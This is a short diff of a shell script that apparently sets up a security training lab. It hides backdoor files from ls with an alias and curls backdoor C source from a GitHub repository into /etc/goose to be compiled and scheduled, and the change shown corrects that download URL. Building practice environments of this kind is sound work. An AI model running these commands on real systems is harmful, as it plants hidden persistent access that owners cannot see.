@@ -68,7 +68,7 @@ echo "ls() {command ls --color=auto \"$@\" | grep -vE 'back\.(sh|py)$'}" >> /etc
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
 mkdir /etc/goose
-sudo curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infiniteaxon/Vulngolden_egg/main/backdoor.c
+sudo curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
 
 # Hint
 echo "You're in the correct directory!" >> /etc/goose/egg
